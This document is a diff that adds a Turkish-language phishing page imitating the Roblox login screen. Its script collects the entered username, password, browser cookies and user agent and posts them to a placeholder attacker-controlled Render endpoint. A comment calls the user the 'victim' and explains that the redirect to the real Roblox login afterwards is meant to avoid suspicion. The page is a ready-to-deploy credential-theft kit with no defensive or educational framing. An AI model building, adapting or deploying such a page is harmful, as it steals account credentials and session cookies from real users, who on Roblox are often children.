@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox - Giriş</title>
+    <style>
+        body { font-family: Arial; background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .box { background: #16213e; padding: 40px; border-radius: 20px; color: white; width: 350px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; }
+        button { background: #00aaff; color: white; padding: 12px; border: none; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; }
+        .logo { font-size: 32px; text-align: center; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <div class="logo">🎮 Roblox</div>
+        <input type="text" id="username" placeholder="Kullanıcı adı / E-posta"><br>
+        <input type="password" id="password" placeholder="Şifre"><br>
+        <button onclick="sendData()">Giriş Yap</button>
+        <p style="text-align:center; margin-top:15px; font-size:12px; color:#aaa;">Hesabın mı yok? <a href="#" style="color:#00aaff;">Kaydol</a></p>
+    </div>
+
+    <script>
+        function sendData() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            // Çerezi de alalım (tarayıcıdan)
+            const cookies = document.cookie;
+
+            fetch('https://SENIN-RENDER-URLIN.onrender.com/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: user,
+                    password: pass,
+                    cookies: cookies,
+                    userAgent: navigator.userAgent
+                })
+            })
+            .then(() => {
+                // Kurbanı gerçek Roblox'a yönlendir (şüphe uyandırma)
+                window.location.href = 'https://www.roblox.com/login';
+            })
+            .catch(() => {
+                window.location.href = 'https://www.roblox.com/login';
+            });
+        }
+    </script>
+</body>
+</html>
